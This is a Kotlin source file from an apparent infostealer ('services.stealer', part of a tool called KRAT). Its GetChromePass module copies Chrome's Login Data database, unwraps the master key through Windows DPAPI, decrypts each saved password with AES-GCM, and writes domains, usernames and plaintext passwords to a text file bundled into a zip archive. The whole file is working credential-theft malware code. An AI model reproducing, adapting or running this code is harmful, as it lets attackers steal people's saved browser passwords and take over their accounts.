package services.stealer

import KRAT
import com.sun.jna.platform.win32.Crypt32Util
import kotlinx.serialization.json.Json
import java.io.File
import java.nio.charset.Charset
import java.nio.charset.StandardCharsets
import java.sql.Connection
import java.sql.DriverManager
import java.sql.ResultSet
import java.sql.Statement
import java.util.zip.ZipOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.io.encoding.Base64
import kotlin.io.encoding.ExperimentalEncodingApi

object GetChromePass : Module {

    override fun run(outputStream: ZipOutputStream) {
        val appData = System.getenv("APPDATA")

        val masterKey = getMasterKey("$appData/Google/Chrome/User Data/Local State")
        val loginDb = "$appData/Google/Chrome/User Data/default/Login Data"
        val login = "${KRAT.cacheDir}/Loginvault1.db"

        // Copying the login database
        File(loginDb).copyTo(File(login), overwrite = true)

        val connection: Connection = DriverManager.getConnection("jdbc:sqlite:$login")
        val statement: Statement = connection.createStatement()
        val resultSet: ResultSet = statement.executeQuery("SELECT action_url, username_value, password_value FROM logins")

        File("${KRAT.cacheDir}/Google Passwords.txt").bufferedWriter(Charset.forName("cp437")).use { writer ->
            while (resultSet.next()) {
                val url = resultSet.getString("action_url")
                val username = resultSet.getString("username_value")
                val encryptedPassword = resultSet.getBytes("password_value")
                val decryptedPassword = decryptVal(encryptedPassword, masterKey)

                if (url.isNotEmpty()) {
                    writer.write("Domain: $url\nUser: $username\nPass: $decryptedPassword\n\n")
                }
            }
        }

        resultSet.close()
        statement.close()
        connection.close()

        // Deleting the copied database
        File(login).delete()
    }

    @OptIn(ExperimentalEncodingApi::class)
    private fun getMasterKey(path: String): ByteArray {
        val content = File(path).readText(StandardCharsets.UTF_8)
        val localState = Json.decodeFromString<Map<String, Any>>(content)

        val encryptedKeyBase64 = localState["os_crypt"]?.let { (it as Map<String, Any>)["encrypted_key"] } as String
        val encryptedKey = Base64.decode(encryptedKeyBase64)

        val masterKey = encryptedKey.copyOfRange(5, encryptedKey.size)
        return Crypt32Util.cryptUnprotectData(masterKey)
    }

    private fun decryptVal(buff: ByteArray, masterKey: ByteArray): String {
        return try {
            val iv = buff.copyOfRange(3, 15)
            val payload = buff.copyOfRange(15, buff.size)

            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val secretKey = SecretKeySpec(masterKey, "AES")
            val gcmParameterSpec = GCMParameterSpec(128, iv) // 128-bit authentication tag length
            cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec)

            val decryptedPass = cipher.doFinal(payload)
            String(decryptedPass.copyOfRange(0, decryptedPass.size - 16), Charsets.UTF_8)
        } catch (e: Exception) {
            "Failed to decrypt password"
        }
    }
}